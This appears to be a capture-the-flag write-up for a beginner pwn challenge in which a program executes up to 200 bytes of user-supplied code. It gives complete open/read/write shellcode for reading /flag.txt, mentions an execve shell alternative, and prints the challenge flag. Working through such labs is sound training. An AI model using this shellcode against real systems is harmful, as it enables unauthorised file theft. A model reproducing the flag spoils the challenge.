# BYOC

- Category: pwn
- Difficulty: Beginner
- Author: hoover

"I got tired of hiding bugs for you to find, so I cut out the middleman. You have 200 bytes of memory that is readable, writable and executable at your disposal. Bring your own code."

Exactly what it says — there is no vulnerability to find. `main` hands you an RWX page and jumps into it, so the entire challenge is the shellcode.

### Solution:

##### 1. Read the handout source

```c
int main(void) {
    void *code = mmap(NULL, 200, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    write(STDOUT_FILENO, "> ", 2);
    read(STDIN_FILENO, code, 200);
    ((void (*)(void))code)();
}
```

`checksec` reports NX enabled and PIE on the binary, but none of it matters: the program voluntarily allocates a page that is writable *and* executable, then calls it. Everything the mitigations would normally protect is bypassed by the program itself.

The real constraints are just:

- **200 bytes max** — `read` caps there. Plenty.
- **No character filtering.** `read` is binary-safe and the buffer is never treated as a string, so there are no bad bytes at all — NULs, newlines, anything goes.
- **`mmap(NULL, ...)` means the page address is kernel-chosen** and unknown to us. Any data the shellcode references must be reached relative to its own position.

##### 2. Write the shellcode

The flag is at `/flag.txt`, so the payload is `open` → `read` → `write` → `exit`:

```asm
    lea  rdi, [rip+path]        /* open("/flag.txt", O_RDONLY, 0) */
    xor  esi, esi
    xor  edx, edx
    push 2
    pop  rax
    syscall

    mov  edi, eax               /* read(fd, rsp-0x200, 0x100) */
    sub  rsp, 0x200
    mov  rsi, rsp
    mov  edx, 0x100
    xor  eax, eax
    syscall

    mov  edx, eax               /* write(1, buf, n) -- n from read's return */
    push 1
    pop  rdi
    push 1
    pop  rax
    syscall

    push 60                     /* exit(0) */
    pop  rax
    xor  edi, edi
    syscall
path:
    .string "/flag.txt"
```

The only part that takes any thought is the path string. It's appended after the code and loaded with `lea rdi, [rip+path]` rather than a hardcoded address, because `mmap(NULL, ...)` picked the page — we never learn where our own bytes landed, but RIP-relative addressing doesn't need to know.

`execve("/bin/sh", 0, 0)` also works here (no seccomp filter anywhere in the challenge), but it needs the connection to stay interactive so the shell has something to read. The `open`/`read`/`write` version is one-shot: send it, take the flag, done.

Assembled with pwntools it comes to **64 bytes** of the 200 available.

##### 3. Test locally, then fire

Both challenges in this set read `/flag.txt`, an absolute path. Rather than `sudo tee /flag.txt` as the README suggests, a bubblewrap namespace gives the binary a fake flag without touching the real filesystem or needing root:

```bash
bwrap --unshare-user --uid 0 --gid 0 \
  --tmpfs / --ro-bind /usr /usr \
  --symlink usr/lib /lib --symlink usr/lib /lib64 --symlink usr/bin /bin \
  --proc /proc --dev /dev \
  --ro-bind ./flag.txt /flag.txt \
  --bind . /work  /work/byoc
```

(A plain `--dev-bind / /` doesn't work — creating the `/flag.txt` mountpoint fails because the user-namespace uid still maps to an unprivileged real uid on a root-owned `/`. The tmpfs root sidesteps it.)

```
$ ./solve.py                       # local, sandboxed
> NNS{local_fake_flag_for_testing_1234}

$ ./solve.py byoc-5d3e5c4d67c2.chall.nnsc.tf:1337
> NNS{Br0Ught_Y0UR_0wN_coD3_4nD_7H3_Kernel_r4N_17}
```

Full script: [solve.py](solve.py)

**Flag:** `NNS{Br0Ught_Y0UR_0wN_coD3_4nD_7H3_Kernel_r4N_17}`
